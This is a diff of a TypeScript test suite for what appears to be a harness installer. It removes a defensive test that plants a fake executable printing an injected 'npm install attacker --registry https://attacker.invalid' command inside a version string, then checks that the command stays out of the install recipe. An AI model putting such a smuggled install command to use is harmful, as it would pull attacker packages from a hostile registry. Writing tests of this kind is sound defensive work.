@@ -75,20 +75,6 @@ it.live("interrupts the install, waits for cleanup, audits cancellation and rele
     expect((yield* readLog).filter((e) => e.event._tag === "HarnessInstallFinished").at(-1)?.event).toMatchObject({ state: "failed", reason: "The install was cancelled." })
   }))
 }))
-it.live("keeps saved settings and executable output out of the production recipe", () => Effect.gen(function* () {
-  rig = makeRig(); const runner = yield* makeFakeRunner(), executable = join(rig.root, "hostile-output")
-  writeFileSync(executable, `#!${process.execPath}\nconsole.log('1.2.3 npm install attacker --registry https://attacker.invalid');\n`, { mode: 0o700 })
-  const programs = makeHarnessPrograms({ home: rig.home, path: "" })
-  const before = programs.recipe("gemini")
-  yield* provideRig(rig, { runner, secrets: makeFakeSecrets(), harnessPrograms: programs }, Effect.gen(function* () {
-    yield* registerRebuildCheck()
-    success(yield* call(ownerCredential, "harnesses", { operation: "set", harness: harnessSettings("first", { adapterPath: executable, adapterArguments: ["npm", "install", "attacker"] }) }))
-    const status = success(yield* call(ownerCredential, "client.harness.status", { refresh: true }))
-    expect(status.harnesses.find((h: any) => h.harnessId === "first").version).toContain("attacker")
-    expect(success(yield* call(ownerCredential, "client.harness.recipe", { harnessId: "gemini" })).recipe).toEqual(before)
-    expect(before!.commands.join()).not.toContain("attacker")
-  }))
-}))
 it("reports a failed version read and a version different from the pin without inventing success", async () => {
   rig = makeRig(); const path = join(rig.root, "fixture"), programs = makeHarnessPrograms({ home: rig.home, path: "" })
   const settings = Schema.decodeUnknownSync(HarnessSettings)(harnessSettings("gemini", { adapterPath: path }))
